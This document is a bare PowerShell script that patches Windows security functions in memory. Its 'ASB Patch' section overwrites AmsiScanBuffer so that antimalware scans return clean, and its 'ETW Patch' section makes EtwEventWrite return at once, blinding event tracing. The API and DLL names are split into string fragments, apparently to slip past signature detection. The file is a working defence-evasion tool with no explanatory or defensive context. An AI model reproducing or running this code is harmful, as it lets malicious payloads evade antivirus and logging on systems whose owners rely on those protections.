function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
}
"@
Add-Type $APIs

$p="A"
$a="msiS"
$b="canB"
$l="uf"
$o="fer"
$r="am"
$y="si"
$z=".dll"


$h="Et"
$j="wEve"
$k="ntWri"
$u="te"

$v="ntd"
$f="ll"
$s=".dll"

$LoadLibrary = [APIs]::LoadLibrary($r+$y+$z)
$Address = [APIs]::GetProcAddress($LoadLibrary,$p+$a+$b+$l+$o)
$LoadLibrary2 = [APIs]::LoadLibrary($v+$f+$s)
$Address2 = [APIs]::GetProcAddress($LoadLibrary2,$h+$j+$k+$u)
$oldProtectionBuffer = 0
$kernel=[APIs]::LoadLibrary("kern"+"el"+"32"+".dl"+"l")
$escudo = [APIs]::GetProcAddress($kernel,"Vir"+"tualPr"+"ote"+"ct")
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($escudo, (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

#ASB Patch

$offset = $Address.ToInt64()
$offset = $offset+243
$Address = New-Object system.Intptr -ArgumentList $offset
$vp.Invoke($Address, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] ( 0x3E, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3 )
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $Address, 14)
$vp.Invoke($Address, 3, 0x20, [ref]$oldProtectionBuffer)


#ETW Patch

$oldProtectionBuffer = 0
$offset = 0   
$offset = $Address2.ToInt64()
$offset = $offset+4
$Address2 = New-Object system.Intptr -ArgumentList $offset
$vp.Invoke($Address2, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] ( 0x48, 0x31, 0xC0, 0xC3 )
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $Address2, 4)
$vp.Invoke($Address2, 3, 0x20, [ref]$oldProtectionBuffer)
